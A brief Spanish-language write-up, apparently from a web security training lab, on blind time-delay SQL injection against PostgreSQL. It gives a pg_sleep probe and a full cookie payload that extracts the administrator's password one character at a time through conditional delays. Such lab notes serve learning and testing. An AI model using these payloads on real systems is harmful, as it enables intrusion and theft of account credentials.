# Blind SQL injection with time delays and information retrieval

Para saber que base de datos usa hice lo siguiente y me di cuenta que era postgres: `' pg_sleep(10)--
Luego fui probando con esto:`Cookie: TrackingId=pALzvkW0cA8nKFGx'||(SELECT CASE WHEN (SUBSTRING(password,20,1)='k') THEN pg_sleep(2) ELSE NULL END FROM users WHERE username='administrator')--; session=UM8wm7qaUIHPLZ2RCqzpIHPCY9F2ie4d`